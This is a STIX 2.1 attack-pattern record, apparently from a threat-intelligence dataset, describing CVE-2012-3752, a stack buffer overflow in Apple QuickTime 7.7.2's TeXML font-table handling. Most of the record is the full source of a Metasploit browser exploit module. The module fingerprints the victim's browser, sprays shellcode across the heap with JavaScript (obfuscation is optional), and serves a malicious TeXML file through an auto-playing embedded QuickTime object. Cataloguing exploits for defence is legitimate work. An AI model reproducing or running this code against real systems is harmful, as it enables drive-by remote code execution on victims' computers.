{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5e909775-b62f-42bd-b36e-045d5d2725d6",
    "created": "2024-08-14T16:43:06.179155Z",
    "modified": "2024-08-14T16:43:06.179159Z",
    "name": "Apple QuickTime 7.7.2 TeXML Style Element font-table Field Stack Buffer Overflow",
    "description": " This module exploits a vulnerability found in Apple QuickTime. When handling a TeXML file, it is possible to trigger a stack-based buffer overflow, and then gain arbitrary code execution under the context of the user.  This is due to the QuickTime3GPP.gtx component not handling certain Style subfields properly, as the font-table field, which is used to trigger the overflow in this module. Because of QuickTime restrictions when handling font-table fields, only 0x31-0x39 bytes can be used to overflow, so at the moment DEP/ASLR bypass hasn't been provided. The module has been tested successfully on IE6 and IE7 browsers (Windows XP and Vista). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/apple_quicktime_texml_font_table.rb",
            "external_id": "apple_quicktime_texml_font_table.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-3752"
        },
        {
            "source_name": "reference",
            "url": "http://support.apple.com/kb/HT5581"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :javascript => true,\n  #  :rank       => NormalRanking\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apple QuickTime 7.7.2 TeXML Style Element font-table Field Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability found in Apple QuickTime. When handling\n        a TeXML file, it is possible to trigger a stack-based buffer overflow, and then\n        gain arbitrary code execution under the context of the user.  This is due to the\n        QuickTime3GPP.gtx component not handling certain Style subfields properly, as the\n        font-table field, which is used to trigger the overflow in this module. Because of\n        QuickTime restrictions when handling font-table fields, only 0x31-0x39 bytes can be\n        used to overflow, so at the moment DEP/ASLR bypass hasn't been provided. The module\n        has been tested successfully on IE6 and IE7 browsers (Windows XP and Vista).\n      },\n      'Author'         =>\n        [\n          'Arezou Hosseinzad-Amirkhizi', # Vulnerability Discovery\n          'juan vazquez' # Metasploit Module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '87087' ],\n          [ 'CVE', '2012-3752' ],\n          [ 'BID', '56557' ],\n          [ 'URL', 'http://support.apple.com/kb/HT5581' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'Space' => 1000,\n        },\n      'Platform' => 'win',\n\n      'Targets'  =>\n        [\n          # Tested with QuickTime 7.7.2\n          [ 'Automatic', {} ],\n          [ 'IE 6 on Windows XP SP3', {} ],\n          [ 'Firefox 3.5 on Windows XP SP3', {} ],\n          [ 'Firefox 3.5.1 on Windows XP SP3', {} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-11-07',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation'])\n      ])\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || ''\n\n    browser_name = \"\"\n    if agent =~ /MSIE/\n      browser_version = agent.scan(/MSIE (\\d)/).flatten[0] || ''\n      browser_name = \"IE #{browser_version}\"\n    elsif agent =~ /Firefox\\/3.5$/\n      browser_name = \"Firefox 3.5 \"\n    elsif agent =~ /Firefox\\/3.5.1$/\n      browser_name = \"Firefox 3.5.1\"\n    elsif agent =~ /Opera\\/9/\n      browser_name = \"Opera\"\n    end\n\n    case nt\n      when '5.1'\n        os_name = 'Windows XP SP3'\n      when '6.0'\n        os_name = 'Windows Vista'\n      when '6.1'\n        os_name = 'Windows 7'\n    end\n\n    targets.each do |t|\n      if (!browser_name.empty? and t.name.include?(browser_name)) and (!nt.empty? and t.name.include?(os_name))\n        print_status(\"Target selected as: #{t.name}\")\n        return t\n      end\n    end\n\n    return nil\n  end\n\n\n  def on_request_uri(client, request)\n\n    return if ((p = regenerate_payload(client)) == nil)\n\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n    # Avoid the attack if no suitable target found\n    if my_target.nil?\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    if request.uri =~ /\\.3gp/\n      print_status(\"Sending exploit TEXML (target: #{my_target.name})\")\n\n      my_payload = \"1\" * (1024*16)\n\n      texml = <<-eos\n<?xml version=\"1.0\"?>\n<?quicktime type=\"application/x-quicktime-texml\"?>\n\n<text3GTrack trackWidth=\"176.0\" trackHeight=\"60.0\" layer=\"1\"\n  language=\"eng\" timeScale=\"600\"\n  transform=\"matrix(1.0, 0.0, 0.0, 0.0, 1.0, 0.0, 1, 0, 1.0)\">\n  <sample duration=\"2400\" keyframe=\"true\">\n\n    <description format=\"tx3g\" displayFlags=\"ScrollIn\"\n      horizontalJustification=\"Left\"\n      verticalJustification=\"Top\"\n      backgroundColor=\"0%, 0%, 0%, 100%\">\n\n      <defaultTextBox x=\"0\" y=\"0\" width=\"176\"  height=\"60\"/>\n      <fontTable>\n        <font id=\"1\" name=\"Times\"/>\n      </fontTable>\n\n      <sharedStyles>\n      <style id=\"1\">\n        {font-table: #{my_payload}}\n        {font-style:normal}\n        {font-weight: normal}\n        {font-size:  10}\n        {line-height: 100%}\n        {text-align: right}\n        {text-decoration: underline}\n        {color: 100%, 100%, 100%, 100%}\n        {backgroundcolor: 100%, 100%, 100%, 100%}\n      </style>\n      </sharedStyles>\n    </description>\n\n    <sampleData scrollDelay=\"200\"\n      highlightColor=\"25%, 45%, 65%, 100%\"\n      targetEncoding=\"utf8\">\n\n      <textBox x=\"10\" y=\"10\" width=\"156\"  height=\"40\"/>\n        <text styleID=\"1\">What you need... Metasploit!</text>\n        <highlight startMarker=\"1\" endMarker=\"2\"/>\n        <blink startMarker=\"3\" endMarker=\"4\"/>\n    </sampleData>\n  </sample>\n</text3GTrack>\n      eos\n\n      send_response(client, texml, { 'Content-Type' => \"application/x-quicktime-texml\" })\n\n    else\n      print_status(\"Sending initial HTML\")\n\n      url =  ((datastore['SSL']) ? \"https://\" : \"http://\")\n      url << ((datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(client.peerhost) : datastore['SRVHOST'])\n      url << \":\" + datastore['SRVPORT'].to_s\n      url << get_resource\n\n      fname = rand_text_alphanumeric(4)\n\n      #ARCH used by the victim machine\n      arch = Rex::Arch.endian(my_target.arch)\n      nops = Rex::Text.to_unescape(\"\\x0c\\x0c\\x0c\\x0c\", arch)\n      code = Rex::Text.to_unescape(payload.encoded, arch)\n      randnop = rand_text_alpha(rand(100) + 1)\n\n      # Spray puts payload on 0x31313131\n      if my_target.name =~ /IE/\n        spray = <<-JS\nvar heap_obj = new heapLib.ie(0x20000);\nvar code = unescape(\"#{code}\");\nvar #{randnop} = \"#{nops}\";\nvar nops = unescape(#{randnop});\n\nwhile (nops.length < 0x80000) nops += nops;\nvar offset = nops.substring(0, 0x800 - code.length);\nvar shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\nwhile (shellcode.length < 0x40000) shellcode += shellcode;\nvar block = shellcode.substring(0, (0x80000-6)/2);\n\nheap_obj.gc();\nfor (var i=0; i < 1600; i++) {\n  heap_obj.alloc(block);\n}\n        JS\n\n        #Use heaplib\n        js_spray = heaplib(spray)\n\n        #obfuscate on demand\n        if datastore['OBFUSCATE']\n          js_spray = ::Rex::Exploitation::JSObfu.new(js_spray)\n          js_spray.obfuscate(memory_sensitive: true)\n        end\n      else\n        js_spray = <<-JS\nvar shellcode = unescape(\"#{code}\");\nvar #{randnop} = \"#{nops}\";\nvar bigblock = unescape(#{randnop});\nvar headersize = 20;\nvar slackspace = headersize + shellcode.length;\nwhile (bigblock.length < slackspace) bigblock += bigblock;\nvar fillblock = bigblock.substring(0,slackspace);\nvar block = bigblock.substring(0,bigblock.length - slackspace);\nwhile (block.length + slackspace < 0x40000) block = block + block + fillblock;\nvar memory = new Array();\nfor (i = 0; i < 750; i++){ memory[i] = block + shellcode }\n        JS\n      end\n\n      content =  \"<html>\"\n      content << <<-JSPRAY\n<head>\n<script>\n#{js_spray}\n</script>\n</head>\n      JSPRAY\n      content << \"<body>\"\n\n      content << <<-ENDEMBED\n<OBJECT\nCLASSID=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\"\nWIDTH=\"1\"\nHEIGHT=\"1\"\nCODEBASE=\"http://www.apple.com/qtactivex/qtplugin.cab\">\n<PARAM name=\"SRC\"        VALUE = \"#{url}/#{fname}.3gp\">\n<PARAM name=\"QTSRC\"      VALUE = \"#{url}/#{fname}.3gp\">\n<PARAM name=\"AUTOPLAY\"   VALUE = \"true\"               >\n<PARAM name=\"TYPE\"       VALUE = \"video/quicktime\"    >\n<PARAM name=\"TARGET\"     VALUE = \"myself\"             >\n<EMBED\n  SRC        = \"#{url}/#{fname}.3gp\"\n  QTSRC      = \"#{url}/#{fname}.3gp\"\n  TARGET     = \"myself\"\n  WIDTH      = \"1\"\n  HEIGHT     = \"1\"\n  AUTOPLAY   = \"true\"\n  PLUGIN     = \"quicktimeplugin\"\n  TYPE       = \"video/quicktime\"\n  CACHE      = \"false\"\n  PLUGINSPAGE= \"http://www.apple.com/quicktime/download/\" >\n</EMBED>\n</OBJECT>\n        ENDEMBED\n\n      content << \"</body></html>\"\n\n      send_response(client, content, { 'Content-Type' => \"text/html\" })\n    end\n  end\nend\n\n\n=begin\n* Routine checking only for '1'-'9' chars for the vaules on the vulnerable style fields (font-table, font-size and line-height)\n\nint __fastcall sub_67EED2B0(int a1, int a2)\n{\n  int result; // eax@1\n  unsigned __int8 v3; // cl@2\n\n  for ( result = 0; ; ++result )\n  {\n    v3 = *(_BYTE *)a2++ - 0x30;\n    if ( v3 > 9u )\n      break;\n  }\n  return result;\n}\n=end\n",
    "x_mitre_disclosure_date": "2012-11-07",
    "x_mitre_platforms": [
        "win'"
    ]
}